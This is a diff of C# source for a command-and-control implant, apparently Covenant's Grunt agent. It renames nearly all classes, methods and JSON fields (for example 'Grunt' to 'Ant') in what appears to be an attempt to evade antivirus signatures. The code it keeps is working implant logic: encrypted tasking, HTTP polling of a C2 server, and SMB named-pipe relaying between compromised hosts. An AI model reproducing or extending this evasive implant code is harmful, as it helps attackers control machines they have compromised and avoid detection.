-                    return (json == null || json == "") ? null : GruntTaskingMessage.FromJson(json);
+                    string json = this.Crafter.Retrieve(AntMess);
+                    return (json == null || json == "") ? null : AntTskMess.FromJson(json);
                 }
                 else
                 {
-                    string json = this.Crafter.Retrieve(gruntMessage);
-                    GruntEncryptedMessage wrappedMessage = GruntEncryptedMessage.FromJson(json);
-                    IMessenger relay = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier == wrappedMessage.GUID);
-                    if (relay != null)
+                    string json = this.Crafter.Retrieve(AntMess);
+                    AntEncMess wrpMess = AntEncMess.FromJson(json);
+                    IMessenger rlay = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier == wrpMess.GUID);
+                    if (rlay != null)
                     {
-                        relay.Write(this.Profile.FormatGetResponse(wrappedMessage));
+                        rlay.Write(this.Profile.FormatGetResponse(wrpMess));
                     }
                     return null;
                 }
             }
 
-            public void QueueTaskingMessage(string Message, string Meta = "")
+            public void QTskMess(string Message, string Meta = "")
             {
-                GruntEncryptedMessage gruntMessage = this.Crafter.Create(Message, Meta);
-                string uploaded = this.Profile.FormatPostRequest(gruntMessage);
+                AntEncMess antMess = this.Crafter.Create(Message, Meta);
+                string uploaded = this.Profile.FormatPostRequest(antMess);
                 lock (_MessageQueueLock)
                 {
                     this.MessageQueue.Enqueue(uploaded);
                 }
             }
 
-            public void WriteTaskingMessage()
+            public void WTskMess()
             {
                 try
                 {
@@ -843,7 +867,7 @@
                         }
                     }
                 }
-                catch (InvalidOperationException) {}
+                catch (InvalidOperationException) { }
             }
 
             public void SetAuthenticator(string Authenticator)
@@ -856,33 +880,33 @@
 
             public bool Connect(string Hostname, string PipeName)
             {
-                IMessenger olddownstream = this.DownstreamMessengers.FirstOrDefault(DM => DM.Hostname.ToLower() == (Hostname + ":" + PipeName).ToLower());
-                if (olddownstream != null)
+                IMessenger olddstream = this.DownstreamMessengers.FirstOrDefault(DM => DM.Hostname.ToLower() == (Hostname + ":" + PipeName).ToLower());
+                if (olddstream != null)
                 {
-                    olddownstream.Close();
-                    this.DownstreamMessengers.Remove(olddownstream);
+                    olddstream.Close();
+                    this.DownstreamMessengers.Remove(olddstream);
                 }
 
-                SMBMessenger downstream = new SMBMessenger(Hostname, PipeName);
+                SmbMessgr dstrm = new SmbMessgr(Hostname, PipeName);
                 Thread readThread = new Thread(() =>
                 {
-                    while (downstream.IsConnected)
+                    while (dstrm.IsConnected)
                     {
                         try
                         {
-                            ProfileMessage read = downstream.Read();
+                            ProMessg read = dstrm.Read();
                             if (read != null && !string.IsNullOrEmpty(read.Message))
                             {
-                                if (string.IsNullOrEmpty(downstream.Identifier))
+                                if (string.IsNullOrEmpty(dstrm.Identifier))
                                 {
-                                    GruntEncryptedMessage message = this.Profile.ParsePostRequest(read.Message);
+                                    AntEncMess message = this.Profile.ParsePostRequest(read.Message);
                                     if (message.GUID.Length == 20)
                                     {
-                                        downstream.Identifier = message.GUID.Substring(10);
+                                        dstrm.Identifier = message.GUID.Substring(10);
                                     }
                                     else if (message.GUID.Length == 10)
                                     {
-                                        downstream.Identifier = message.GUID;
+                                        dstrm.Identifier = message.GUID;
                                     }
                                 }
                                 this.UpstreamMessenger.Write(read.Message);
@@ -893,12 +917,12 @@
                             Console.Error.WriteLine("Thread Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                         }
                     }
-                    // Connection became disconnected and therefore we remove the downstream object
-                    this.DownstreamMessengers.Remove(downstream);
+                    // Connection became disconnected and therefore we remove the dstrm object
+                    this.DownstreamMessengers.Remove(dstrm);
                 });
-                downstream.ReadThread = readThread;
-                downstream.ReadThread.Start();
-                this.DownstreamMessengers.Add(downstream);
+                dstrm.ReadThread = readThread;
+                dstrm.ReadThread.Start();
+                this.DownstreamMessengers.Add(dstrm);
                 return true;
             }
 
@@ -915,7 +939,7 @@
             }
         }
 
-        public class SMBMessenger : IMessenger
+        public class SmbMessgr : IMessenger
         {
             public string Hostname { get; } = string.Empty;
             public string Identifier { get; set; } = string.Empty;
@@ -946,7 +970,7 @@
                 set { lock (this._IsConnectedLock) { this._IsConnected = value; } }
             }
 
-            public SMBMessenger(string Hostname, string Pipename)
+            public SmbMessgr(string Hostname, string Pipename)
             {
                 this.Hostname = Hostname;
                 this.PipeName = Pipename;
@@ -954,7 +978,7 @@
                 this.InitializePipe();
             }
 
-            public SMBMessenger(PipeStream Pipe, string Pipename)
+            public SmbMessgr(PipeStream Pipe, string Pipename)
             {
                 this.Pipe = Pipe;
                 this.PipeName = Pipename;
@@ -967,12 +991,12 @@
                 this.InitializePipe();
             }
 
-            public ProfileMessage Read()
+            public ProMessg Read()
             {
-                ProfileMessage result = null;
+                ProMessg result = null;
                 try
                 {
-                    // If the Grunt acts as SMB server, then after an interruption it shall wait in the read method until the connection 
+                    // If the Ant acts as SMB server, then after an interruption it shall wait in the read method until the connection 
                     // is re-established.
                     // This ensures that after the interruption, both communication peers return to their pre-defined state. If this is not
                     // implemented, then both communication peers might return to the same state (e.g., read), which leads to a deadlock.
@@ -982,7 +1006,7 @@
                     }
                     if (this.IsConnected)
                     {
-                        result = new ProfileMessage { Type = MessageType.Read, Message = Common.GruntEncoding.GetString(this.ReadBytes()) };
+                        result = new ProMessg { Type = MessageType.Read, Message = Common.AntEnc.GetString(this.ReadBytes()) };
                     }
                 }
                 // These are exceptions that could be raised, if the named pipe became (unexpectedly) closed. It is important to catch these 
@@ -998,7 +1022,7 @@
             {
                 try
                 {
-                    // If the Grunt acts as SMB client, then after an interruption it shall wait in the write method until the connection 
+                    // If the Ant acts as SMB client, then after an interruption it shall wait in the write method until the connection 
                     // is re-established.
                     // This ensures that after the interruption, both communication peers return to their pre-defined state. If this is not
                     // implemented, then both communication peers might return to the same state (e.g., read), which leads to a deadlock.
@@ -1008,7 +1032,7 @@
                     }
                     if (this.IsConnected)
                     {
-                        this.WriteBytes(Common.GruntEncoding.GetBytes(Message));
+                        this.WriteBytes(Common.AntEnc.GetBytes(Message));
                     }
                 }
                 // These are exceptions that could be raised, if the named pipe became (unexpectedly) closed. It is important to catch these 
@@ -1051,7 +1075,7 @@
                         this.Pipe = newServerPipe;
                         this.IsConnected = true;
                         this.MonitorPipeState();
-                        // Tell the parent Grunt the GUID so that it knows to which child grunt which messages shall be forwarded. Without this message, any further communication breaks.
+                        // Tell the parent Ant the GUID so that it knows to which child grunt which messages shall be forwarded. Without this amess, any further communication breaks.
                         this.UpstreamEventHandler?.Invoke(this, new MessageEventArgs { Message = string.Empty });
                     }
                     // If named pipe became disconnected (!this.IsConnected), then try to re-connect to the SMB server, else continue.
@@ -1139,7 +1163,7 @@
             }
         }
 
-        public class HttpMessenger : IMessenger
+        public class HtpMessgr : IMessenger
         {
             public string Hostname { get; } = "";
             public string Identifier { get; set; } = "";
@@ -1147,7 +1171,7 @@
             public EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }
 
             private string CovenantURI { get; }
-            private CookieWebClient CovenantClient { get; set; } = new CookieWebClient();
+            private MyCWeCli CovenantClient { get; set; } = new MyCWeCli();
             private object _WebClientLock = new object();
 
             private Random Random { get; set; } = new Random();
@@ -1158,9 +1182,9 @@
             private bool UseCertPinning { get; set; }
             private bool ValidateCert { get; set; }
 
-            private Queue<ProfileMessage> ToReadQueue { get; } = new Queue<ProfileMessage>();
+            private Queue<ProMessg> ToReadQueue { get; } = new Queue<ProMessg>();
 
-            public HttpMessenger(string CovenantURI, string CovenantCertHash, bool UseCertPinning, bool ValidateCert, List<string> ProfileHttpHeaderNames, List<string> ProfileHttpHeaderValues, List<string> ProfileHttpUrls)
+            public HtpMessgr(string CovenantURI, string CovenantCertHash, bool UseCertPinning, bool ValidateCert, List<string> ProfileHttpHeaderNames, List<string> ProfileHttpHeaderValues, List<string> ProfileHttpUrls)
             {
                 this.CovenantURI = CovenantURI;
                 this.Hostname = CovenantURI.Split(':')[1].Split('/')[2];
@@ -1176,10 +1200,10 @@
                 this.ValidateCert = ValidateCert;
 
                 ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
-                try { ServicePointManager.SecurityProtocol = ServicePointManager.SecurityProtocol | SecurityProtocolType.Ssl3; } catch {}
-                try { ServicePointManager.SecurityProtocol = ServicePointManager.SecurityProtocol | (SecurityProtocolType)768; } catch {}
-                try { ServicePointManager.SecurityProtocol = ServicePointManager.SecurityProtocol | (SecurityProtocolType)3072; } catch {}
-                try { ServicePointManager.SecurityProtocol = ServicePointManager.SecurityProtocol | (SecurityProtocolType)12288; } catch {}
+                try { ServicePointManager.SecurityProtocol = ServicePointManager.SecurityProtocol | SecurityProtocolType.Ssl3; } catch { }
+                try { ServicePointManager.SecurityProtocol = ServicePointManager.SecurityProtocol | (SecurityProtocolType)768; } catch { }
+                try { ServicePointManager.SecurityProtocol = ServicePointManager.SecurityProtocol | (SecurityProtocolType)3072; } catch { }
+                try { ServicePointManager.SecurityProtocol = ServicePointManager.SecurityProtocol | (SecurityProtocolType)12288; } catch { }
 
                 ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
                 {
@@ -1196,7 +1220,7 @@
                 };
             }
 
-            public ProfileMessage Read()
+            public ProMessg Read()
             {
                 if (this.ToReadQueue.Any())
                 {
@@ -1205,7 +1229,7 @@
                 lock (this._WebClientLock)
                 {
                     this.SetupCookieWebClient();
-                    return new ProfileMessage { Type = MessageType.Read, Message = this.CovenantClient.DownloadString(this.CovenantURI + this.GetURL()) };
+                    return new ProMessg { Type = MessageType.Read, Message = this.CovenantClient.DownloadString(this.CovenantURI + this.GetURL()) };
                 }
             }
 
@@ -1214,7 +1238,7 @@
                 lock (this._WebClientLock)
                 {
                     this.SetupCookieWebClient();
-                    ProfileMessage ToReadMessage = new ProfileMessage { Type = MessageType.Write, Message = this.CovenantClient.UploadString(this.CovenantURI + this.GetURL(), Message) };
+                    ProMessg ToReadMessage = new ProMessg { Type = MessageType.Write, Message = this.CovenantClient.UploadString(this.CovenantURI + this.GetURL(), Message) };
                     if (ToReadMessage.Message != "")
                     {
                         this.ToReadQueue.Enqueue(ToReadMessage);
@@ -1245,55 +1269,55 @@
             }
         }
 
-        public class MessageCrafter
+        public class MessCrftr
         {
             private string GUID { get; }
             private Aes SessionKey { get; }
 
-            public MessageCrafter(string GUID, Aes SessionKey)
+            public MessCrftr(string GUID, Aes SessionKey)
             {
                 this.GUID = GUID;
                 this.SessionKey = SessionKey;
             }
 
-            public GruntEncryptedMessage Create(string Message, string Meta = "")
+            public AntEncMess Create(string Message, string Meta = "")
             {
-                return this.Create(Common.GruntEncoding.GetBytes(Message), Meta);
+                return this.Create(Common.AntEnc.GetBytes(Message), Meta);
             }
 
-            public GruntEncryptedMessage Create(byte[] Message, string Meta = "")
+            public AntEncMess Create(byte[] Message, string Meta = "")
             {
-                byte[] encryptedMessagePacket = Utilities.AesEncrypt(Message, this.SessionKey.Key);
-                byte[] encryptionIV = new byte[Common.AesIVLength];
-                Buffer.BlockCopy(encryptedMessagePacket, 0, encryptionIV, 0, Common.AesIVLength);
-                byte[] encryptedMessage = new byte[encryptedMessagePacket.Length - Common.AesIVLength];
-                Buffer.BlockCopy(encryptedMessagePacket, Common.AesIVLength, encryptedMessage, 0, encryptedMessagePacket.Length - Common.AesIVLength);
+                byte[] encMessPak = Utilities.AesEncrypt(Message, this.SessionKey.Key);
+                byte[] encIV = new byte[Common.AesIVLength];
+                Buffer.BlockCopy(encMessPak, 0, encIV, 0, Common.AesIVLength);
+                byte[] encMess = new byte[encMessPak.Length - Common.AesIVLength];
+                Buffer.BlockCopy(encMessPak, Common.AesIVLength, encMess, 0, encMessPak.Length - Common.AesIVLength);
 
-                byte[] hmac = Utilities.ComputeHMAC(encryptedMessage, SessionKey.Key);
-                return new GruntEncryptedMessage
+                byte[] hmac = Utilities.ComputeHMAC(encMess, SessionKey.Key);
+                return new AntEncMess
                 {
                     GUID = this.GUID,
                     Meta = Meta,
-                    EncryptedMessage = Convert.ToBase64String(encryptedMessage),
-                    IV = Convert.ToBase64String(encryptionIV),
+                    EncryptedMessage = Convert.ToBase64String(encMess),
+                    IV = Convert.ToBase64String(encIV),
                     HMAC = Convert.ToBase64String(hmac)
                 };
             }
 
-            public string Retrieve(GruntEncryptedMessage message)
+            public string Retrieve(AntEncMess message)
             {
                 if (message == null || !message.VerifyHMAC(this.SessionKey.Key))
                 {
                     return null;
                 }
-                return Common.GruntEncoding.GetString(Utilities.AesDecrypt(message, SessionKey.Key));
+                return Common.AntEnc.GetString(Utilities.AesDecrypt(message, SessionKey.Key));
             }
         }
 
-        public class CookieWebClient : WebClient
+        public class MyCWeCli : WebClient
         {
             private CookieContainer CookieContainer { get; }
-            public CookieWebClient()
+            public MyCWeCli()
             {
                 this.CookieContainer = new CookieContainer();
             }
@@ -1310,7 +1334,7 @@
             }
         }
 
-        public enum GruntTaskingType
+        public enum AntTskType
         {
             Assembly,
             SetDelay,
@@ -1324,28 +1348,28 @@
             TaskKill
         }
 
-        public class GruntTaskingMessage
+        public class AntTskMess
         {
-            public GruntTaskingType Type { get; set; }
+            public AntTskType Type { get; set; }
             public string Name { get; set; }
             public string Message { get; set; }
             public bool Token { get; set; }
 
-            private static string GruntTaskingMessageFormat = @"{{""type"":""{0}"",""name"":""{1}"",""message"":""{2}"",""token"":{3}}}";
-            public static GruntTaskingMessage FromJson(string message)
+            private static string GruntTaskingMessageFormat = @"{{""type"":""{0}"",""name"":""{1}"",""amess"":""{2}"",""token"":{3}}}";
+            public static AntTskMess FromJson(string message)
             {
                 List<string> parseList = Utilities.Parse(message, GruntTaskingMessageFormat);
                 if (parseList.Count < 3) { return null; }
-                return new GruntTaskingMessage
+                return new AntTskMess
                 {
-            Type = (GruntTaskingType)Enum.Parse(typeof(GruntTaskingType), parseList[0], true),
+                    Type = (AntTskType)Enum.Parse(typeof(AntTskType), parseList[0], true),
                     Name = parseList[1],
                     Message = parseList[2],
                     Token = Convert.ToBoolean(parseList[3])
                 };
             }
 
-            public static string ToJson(GruntTaskingMessage message)
+            public static string ToJson(AntTskMess message)
             {
                 return String.Format(
                     GruntTaskingMessageFormat,
@@ -1357,7 +1381,7 @@
             }
         }
 
-        public enum GruntTaskingStatus
+        public enum AntTskStat
         {
             Uninitialized,
             Tasked,
@@ -1366,28 +1390,28 @@
             Aborted
         }
 
-        public class GruntTaskingMessageResponse
+        public class AntTskMessResp
         {
-            public GruntTaskingMessageResponse(GruntTaskingStatus status, string output)
+            public AntTskMessResp(AntTskStat status, string output)
             {
                 Status = status;
                 Output = output;
             }
-            public GruntTaskingStatus Status { get; set; }
+            public AntTskStat Status { get; set; }
             public string Output { get; set; }
 
-            private static string GruntTaskingMessageResponseFormat = @"{{""status"":""{0}"",""output"":""{1}""}}";
+            private static string AntTskMEssResponseFormat = @"{{""status"":""{0}"",""myout"":""{1}""}}";
             public string ToJson()
             {
                 return String.Format(
-                    GruntTaskingMessageResponseFormat,
+                    AntTskMEssResponseFormat,
                     this.Status.ToString("D"),
                     Utilities.JavaScriptStringEncode(this.Output)
                 );
             }
         }
 
-        public class GruntEncryptedMessage
+        public class AntEncMess
         {
             public enum GruntEncryptedMessageType
             {
@@ -1395,12 +1419,12 @@
                 Tasking
             }
 
-        public string GUID { get; set; } = "";
+            public string GUID { get; set; } = "";
             public GruntEncryptedMessageType Type { get; set; }
             public string Meta { get; set; } = "";
-        public string IV { get; set; } = "";
-        public string EncryptedMessage { get; set; } = "";
-        public string HMAC { get; set; } = "";
+            public string IV { get; set; } = "";
+            public string EncryptedMessage { get; set; } = "";
+            public string HMAC { get; set; } = "";
 
             public bool VerifyHMAC(byte[] Key)
             {
@@ -1416,12 +1440,12 @@
                 }
             }
 
-            private static string GruntEncryptedMessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
-            public static GruntEncryptedMessage FromJson(string message)
+            private static string AntEncMessForm = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
+            public static AntEncMess FromJson(string message)
             {
-          List<string> parseList = Utilities.Parse(message, GruntEncryptedMessageFormat);
+                List<string> parseList = Utilities.Parse(message, AntEncMessForm);
                 if (parseList.Count < 5) { return null; }
-                return new GruntEncryptedMessage
+                return new AntEncMess
                 {
                     GUID = parseList[0],
                     Type = (GruntEncryptedMessageType)int.Parse(parseList[1]),
@@ -1432,10 +1456,10 @@
                 };
             }
 
-            public static string ToJson(GruntEncryptedMessage message)
+            public static string ToJson(AntEncMess message)
             {
                 return String.Format(
-                    GruntEncryptedMessageFormat,
+                    AntEncMessForm,
                     Utilities.JavaScriptStringEncode(message.GUID),
                     message.Type.ToString("D"),
                     Utilities.JavaScriptStringEncode(message.Meta),
@@ -1451,7 +1475,7 @@
             public static int AesIVLength = 16;
             public static CipherMode AesCipherMode = CipherMode.CBC;
             public static PaddingMode AesPaddingMode = PaddingMode.PKCS7;
-            public static Encoding GruntEncoding = Encoding.UTF8;
+            public static Encoding AntEnc = Encoding.UTF8;
         }
 
         public static class Utilities
@@ -1488,7 +1512,7 @@
             }
 
             // Convenience method for decrypting an EncryptedMessagePacket
-            public static byte[] AesDecrypt(GruntEncryptedMessage encryptedMessage, byte[] key)
+            public static byte[] AesDecrypt(AntEncMess encryptedMessage, byte[] key)
             {
                 byte[] iv = Convert.FromBase64String(encryptedMessage.IV);
                 byte[] encrypted = Convert.FromBase64String(encryptedMessage.EncryptedMessage);
@@ -1552,7 +1576,7 @@
             public static List<string> Parse(string data, string format)
             {
                 format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
-          if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
+                if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
                 if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
                 if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
                 if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
@@ -1560,7 +1584,7 @@
                 if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
                 Match match = new Regex(format).Match(data);
                 List<string> matches = new List<string>();
-          if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
+                if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
                 if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
                 if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
                 if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
